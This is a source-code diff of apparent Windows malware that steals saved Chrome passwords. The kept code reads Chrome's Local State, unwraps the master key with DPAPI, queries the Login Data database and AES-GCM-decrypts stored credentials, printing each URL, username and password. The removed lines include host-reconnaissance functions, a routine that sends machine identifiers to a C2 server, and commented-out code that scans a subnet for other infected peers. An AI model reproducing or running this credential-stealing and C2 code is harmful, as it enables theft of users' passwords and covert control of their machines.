@@ -5,98 +5,19 @@
  * linked C2 server
  * ***********************************/
 
-// TODO
-// Read environment variables
-// List network interfaces
-// Get Windows Version
-// Retrieve username + token
-// Retrieve computer name
-// Retrieve machine GUID
-// List files in directory
-// Change directory
-// List running processes
 
 #include <tchar.h>
 #include <windows.h>
 #include <wincrypt.h>
 #include <bcrypt.h>
 #include <stdio.h>
-#include <winhttp.h>
-#include <tlhelp32.h>
-#include <dirent.h>
-#include <iphlpapi.h>
-#include <zmq.h>
+
 #include <sqlite3.h> //May need to be dynamically Linked for less carbon footprint
 #include <aes_gcm.h>
+#include <vector>
+#include <string>
 
-
-// Use iphlpapi to get interface info
-void NetworkInterfaces(){
-
-}
-
-// List environment variables
-void EnvVariables(){
-
-}
-
-// Print all running processes
-void RunningProcesses(){
-    HANDLE hSnap;
-    PROCESSENTRY32 ProcessStruct;
-    ProcessStruct.dwSize = sizeof(PROCESSENTRY32);
-    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if(hSnap == INVALID_HANDLE_VALUE){
-        printf("Snapshot failure: %d\n", GetLastError());
-    }
-    if(Process32First(hSnap, &ProcessStruct) == FALSE){
-        printf("Snapshot failure: %d\n", GetLastError());
-    }
-    do{
-        printf("%s\n", ProcessStruct.szExeFile);
-    }while(Process32Next(hSnap, &ProcessStruct));
-    CloseHandle(hSnap);
-}
-
-// Identify system using product ID
-wchar_t* ProductID(){
-    wchar_t* value = (wchar_t*)malloc(30*sizeof(wchar_t));
-	DWORD size = 30*sizeof(wchar_t);
-	RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductId", RRF_RT_REG_SZ, NULL, (PVOID)value, &size);
-    return value;
-}
-
-// Retrieve computer name
-wchar_t* ComputerName(){
-    wchar_t* value = (wchar_t*)malloc(30*sizeof(wchar_t));;
-	DWORD size = 30*sizeof(char);
-	RegGetValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName", "ComputerName", RRF_RT_REG_SZ, NULL, (PVOID)value, &size);
-	return value;
-}
-
-// Retrieve current user
-wchar_t* CurrentUser(){
-    wchar_t* value = (wchar_t*)malloc(30*sizeof(wchar_t));;
-	DWORD size = 30*sizeof(char);
-	RegGetValue(HKEY_CURRENT_USER, "Volatile Environment", "USERNAME", RRF_RT_REG_SZ, NULL, (PVOID)value, &size);
-	return value;
-}
-
-// Windows release
-wchar_t* OSName(){
-    wchar_t* name = (wchar_t*)malloc(30*sizeof(wchar_t));
-    DWORD size = 30*sizeof(char);
-    RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", RRF_RT_REG_SZ, NULL, (PVOID)name, &size);
-    return name;
-}
-
-// Windows build
-wchar_t* OSVersion(){
-    wchar_t* build = (wchar_t*)malloc(30*sizeof(wchar_t));
-	DWORD size = 30*sizeof(char);
-	RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CurrentBuild", RRF_RT_REG_SZ, NULL, (PVOID)build, &size);
-    return build;
-}
+#include <iostream>
 
 //Get Local State
 BYTE* getLocalState(){
@@ -178,26 +99,7 @@ DATA_BLOB decryptDPAPI(BYTE* encryptedBytes, DWORD encryptBytesSize) {
         return out;
     }
 }
-/**
-void Decrypt(BYTE* nonce, DWORD nonceLen, BYTE* data, DWORD datalen, char* hKey){
 
-
-
-    NTSTATUS nStatus = BCryptDecrypt(
-        hKey,
-        data, dataLen,
-        null,
-        nonce, nonceLen,
-        null, 0,
-        &ptBufferSize, 0
-    );
-    if (!NT_SUCCESS(nStatus)){
-         printf("**** Error 0x%x returned by BCryptGetProperty ><\n", nStatus);
-         Cleanup();
-         return;
-    }
-}
-**/
 //Get Encrpytion Key
 DATA_BLOB getEncryptKey(){
     BYTE* localState = getLocalState();
@@ -225,6 +127,7 @@ DATA_BLOB getEncryptKey(){
         }
     }
     free(localState);
+
 
     DWORD keySize = strlen(token);
     DWORD bufSize = 0;
@@ -258,150 +161,22 @@ DATA_BLOB getEncryptKey(){
     return masterKey;
 }
 
-char* AESDecrypt(char* pass, DWORD passSize, BYTE* masterKey, DWORD masterKeySize){
-    DWORD ivSize = 12;
-    DWORD cipherTextSize = passSize - 15;
-    DWORD ptBufferSize = 0;
-    BCRYPT_ALG_HANDLE hAlg = 0;
-    BCRYPT_KEY_HANDLE hKey = 0;
-    printf("DEBUG PassSize: %d\n", passSize);
+char* AESDecrypt(char* pass, BYTE* masterKey){
+    if(strlen(pass) > 31){
+        auto aes = new AESGCM(masterKey);
 
-    printf("DEBUG FOR MASTER KEY!!!\n");
-    for (int i = 0; i < masterKeySize; i++){
-        printf(" %02x ", masterKey[i]);
-    }
+        std::string password(pass);
 
-    BYTE* iv = (BYTE*) malloc (ivSize); 
-    if(iv == NULL) {
-        printf("Memory not successfully Allocated.\n");
-    }
-    printf("DEBUG PASS: %s\n", pass);
-    for (int i = 3; i < 15; i++){
-        iv[i-3] = pass[i];
-    }
-    
-    printf("DEBUG IV %s\n", iv);
-    for(int i = 0; i < ivSize; i++){
-    printf(" %02x ", iv[i]);
-    }
-    
-    BYTE* cipherText = (BYTE*) malloc (cipherTextSize);
-    if(cipherText == NULL) {
-        printf("Memory not successfully Allocated.\n");
-    }
-    for (int i = 15; i < passSize; i++){
-        cipherText[i-15] = pass[i];
-    }
-    printf("DEBUG CIPHERTEXT %s\n", cipherText);
-    for(int i = 0; i < cipherTextSize; i++){
-        printf(" %02x ", cipherText[i]);
-    }
-    // create a handle to an AES-GCM provider
-    NTSTATUS nStatAlg = ::BCryptOpenAlgorithmProvider(
-        &hAlg, 
-        BCRYPT_AES_ALGORITHM, 
-        MS_PRIMITIVE_PROVIDER, 
-        0);
-    if (! NT_SUCCESS(nStatAlg))
-    {
-        printf("**** Error 0x%x returned by BCryptOpenAlgorithmProvider\n", nStatAlg);
-    }
-    if (!hAlg){
-        printf("Invalid handle!\n");
-    }
+        std::string iv(password.substr(3, 12));
+        std::string cipher(password.substr(15, password.size()-31));
+        std::string tag(password.substr(password.size()-16));
 
-
-    BYTE* fodderBuffers = (BYTE*) malloc (64);
-    if(fodderBuffers == NULL) {
-        printf("Memory not successfully Allocated.\n");
+        aes->Decrypt((BYTE*)iv.c_str(), iv.size(), (BYTE*)cipher.c_str(), cipher.size(), (BYTE*)tag.c_str(), tag.size());
+        aes->plaintext[cipher.size()] = '\0';
+        return (char*)aes->plaintext;
+    }else{
+        return "";
     }
-    NTSTATUS fodder2 = BCryptGetProperty(
-        hAlg,
-        BCRYPT_CHAINING_MODE,
-        fodderBuffers,
-        64,
-        NULL,
-        0
-    );
-
-    printf("DEBUG FOR ME: %s\n", fodderBuffers);
-
-    NTSTATUS nStatProp = ::BCryptSetProperty(
-        hAlg, 
-        BCRYPT_CHAINING_MODE, 
-        (BYTE*) BCRYPT_CHAIN_MODE_GCM, 
-        sizeof(BCRYPT_CHAIN_MODE_GCM), 
-        0);
-    if (!NT_SUCCESS(nStatProp)){
-         printf("**** Error 0x%x returned by BCryptGetProperty ><\n", nStatProp);
-    }
-
-    BYTE* fodderBuffer = (BYTE*) malloc (64);
-    if(fodderBuffer == NULL) {
-        printf("Memory not successfully Allocated.\n");
-    }
-    NTSTATUS fodder = BCryptGetProperty(
-        hAlg,
-        BCRYPT_CHAINING_MODE,
-        fodderBuffer,
-        64,
-        NULL,
-        0
-    );
-    printf("DEBUG FOR ME: %s\n", fodderBuffer);
-
-    free(fodderBuffer);
-    free(fodderBuffers);
-
-    NTSTATUS nStatSymKey = ::BCryptGenerateSymmetricKey(
-        hAlg, 
-        &hKey, 
-        NULL, 
-        0, 
-        masterKey, 
-        masterKeySize, 
-        0);
-    if (!NT_SUCCESS(nStatSymKey)){
-        printf("**** Error 0x%x returned by BCryptGenerateSymmetricKey\n", nStatSymKey);
-    }
-
-    BYTE* firstText = (BYTE*) malloc (1000);
-    if(firstText == NULL) {
-        printf("Memory not successfully Allocated.\n");
-    }
-    
-    
-    NTSTATUS nStatus = BCryptDecrypt(
-        hKey, 
-        cipherText, cipherTextSize, 
-        NULL, 
-        iv, ivSize,
-        NULL, 0, 
-        &ptBufferSize, 0);
-
-    printf("DEBUG Buffer size %d\n", ptBufferSize);
-    BYTE* plaintext = (BYTE*) malloc (ptBufferSize+1);
-    if(plaintext == NULL) {
-        printf("Memory not successfully Allocated.\n");
-    }
-    if(NT_SUCCESS(nStatus)){ 
-        DWORD dwBytesDone = 0;
-        NTSTATUS nFStatus = BCryptDecrypt(
-            hKey, 
-            cipherText, cipherTextSize, 
-            NULL, 
-            iv, ivSize, 
-            plaintext, ptBufferSize, 
-            &dwBytesDone, 0);
-        if(!NT_SUCCESS(nFStatus)){
-            printf("FAILED %32x", nFStatus);
-        }
-        printf("DEBUG PLAINTEXT %s", plaintext);
-        return (char*) plaintext;
-    };
-    printf("DEBUG PLAINTEXT %s", plaintext);
-    free(firstText);
-    return (char*) ("error" + GetLastError());
 }
 
 // Decrypt Looted Chrome Passwords
@@ -502,7 +277,6 @@ wchar_t* GetPass(DATA_BLOB masterKey){
                 char* username = (char*) sqlite3_column_text(stmt,1);
                 char* password = (char*)sqlite3_column_text(stmt,2); //This is the only encrypted field
                 DWORD passSize = sqlite3_column_bytes(stmt, 2);
-                printf("DEBUG PASSWORD: %s\n", password);
                 printf("Url: %s\n",url);
                 if(username == NULL){
                     printf("Username: ");
@@ -511,9 +285,9 @@ wchar_t* GetPass(DATA_BLOB masterKey){
                 printf("Username: %s\n",username);
                 }
                 
-                char* decrypted =  AESDecrypt(password, passSize, masterKey.pbData, masterKey.cbData);
+                char* decrypted =  AESDecrypt(password, masterKey.pbData);
                 if (decrypted != NULL){
-                    printf("Password: %s\n", decrypted);
+                    printf("Password: %s\n\n", decrypted);
                 }
             }
         }
@@ -531,160 +305,8 @@ wchar_t* GetPass(DATA_BLOB masterKey){
     return NULL;
 }
 
-// List files in directory
-void ls(char* path){
-    // Open context
-    DIR *d;
-    d = opendir(path);
 
-    struct dirent *de;
-    if (d != NULL){
-        while ( de = readdir(d)){
-            printf("%s\n", de->d_name);
-        }
-        closedir(d);
-    }
-}
-
-
-void RegisterC2(){
-
-    HINTERNET session = WinHttpOpen(
-        L"Diplomat", 
-        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
-        WINHTTP_NO_PROXY_NAME, 
-        WINHTTP_NO_PROXY_BYPASS, 
-        0
-    );
-
-    if (session)
-    {
-        HINTERNET connection = WinHttpConnect(
-            session, 
-            L"127.0.0.1", 
-            5000, 
-            0
-        );
-        
-        if (connection) {
-            HINTERNET request = WinHttpOpenRequest(
-                connection,
-                L"POST",
-                L"/register",
-                L"HTTP/1.1",
-                WINHTTP_NO_REFERER,
-                WINHTTP_DEFAULT_ACCEPT_TYPES,
-                0
-            );
-            
-            if(request){
-                wchar_t* headers = (wchar_t*)L"Content-Type: application/json\r\n";
-                char* jsonData = (char*) malloc(512);
-                wchar_t* productID = ProductID();
-                wchar_t* OSRelease = OSName();
-                wchar_t* OSBuild = OSVersion();
-                wchar_t* username = CurrentUser();
-                wchar_t* computerName = ComputerName();
-                sprintf(jsonData, "{ \"ProductID\": \"%s\", \"OSName\": \"%s\", \"OSBuild\": \"%s\", \"Username\": \"%s\", \"ComputerName\": \"%s\" }", productID, OSRelease, OSBuild, username, computerName);
-                size_t size = strlen(jsonData) * sizeof(char);
-
-                BOOL result = WinHttpSendRequest(
-                    request, 
-                    headers,
-                    -1,
-                    jsonData,
-                    size,
-                    size,
-                    (DWORD_PTR)NULL
-                );
-                
-                if(result){
-                    result = WinHttpReceiveResponse(request, NULL);
-                }
-                DWORD responseSize;
-                if(result){
-                    result = WinHttpQueryDataAvailable(request, &responseSize);
-                }
-                if(result){
-                    // Handle response
-                }
-            }else{
-                printf("%d\n", GetLastError());
-            }
-            WinHttpCloseHandle(request);
-        }else{
-            printf("%d\n", GetLastError());
-        }
-        WinHttpCloseHandle(connection);
-    }else{
-        printf("%d\n", GetLastError());
-    }
-    WinHttpCloseHandle(session);
-}
-
-/**
-wchar_t* GetTasks(){
-
-}
-**/
 int _tmain(int argc, _TCHAR *argv[]){
-
-    if(argc == 1){
-        // Report intrusion to C2
-        // RegisterC2();
-        DATA_BLOB encKey = getEncryptKey();
-        GetPass(encKey);
-    }
-/**
-        while(1){
-            wchar_t* tasks = GetTasks();
-            
-            int jitter = (rand() % 20) - 10;
-            Sleep(30+jitter);
-        }
-    }
-**/
-    // Do malware things (investigation, looting, persistence)
-
-    // Situational Awareness tasks
-    //RunningProcesses();
-    //ls(".");
-    //wchar_t* productID = ProductID();
-    //printf("%s\n", productID);
-    //ComputerName();
-    //CurrentUser();
-    //OSVersion();
-    //NetworkInterfaces();
-
-
-    /*
-
-    // Establish peer network
-    // Create a router for recieving messages
-    void* context = zmq_ctx_new();
-    void* router = zmq_socket(context, ZMQ_ROUTER);
-    int success = zmq_bind(router, "tcp://*:8889");
-    if (success != 0){
-
-    }
-
-    // Scan network for other infected machines
-    // Brute force method
-    void* dealer = zmq_socket(context, ZMQ_DEALER);
-    for(int address = 1; address < 255; address++){
-        zmq_connect(dealer, "tcp://192.168.56.%d:8889", address);
-    }
-
-
-    // Timed loop for checking potential peers and retrieving commands from c2
-    while(1){
-        // Read router activity
-        _TCHAR* buffer = malloc(64*sizeof(char));
-        zmq_recv(router, buffer, 64, 0);
-        printf("Incoming message: %s", buffer);
-        Sleep(10000);
-        zmq_send(dealer, buffer, 64, 0);
-    }
-
-    */
+    DATA_BLOB encKey = getEncryptKey();
+    GetPass(encKey);
 }
